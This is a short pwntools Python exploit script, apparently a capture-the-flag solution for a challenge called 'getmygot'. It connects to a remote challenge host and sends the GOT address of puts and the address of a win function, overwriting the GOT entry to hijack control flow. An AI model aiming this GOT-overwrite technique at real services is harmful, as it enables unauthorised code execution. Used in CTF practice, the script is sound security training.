from pwn import *

#p = process("./getmygot")
#gdb.attach(p)

p = remote("forever.isss.io", 1307)

puts_got = "0x404018"
win = "0x401196" 

p.recvuntil(b"Probably not tbh...")
p.sendline(str(int(puts_got, 16)).encode())
p.sendline(str(int(win, 16)).encode())

p.interactive()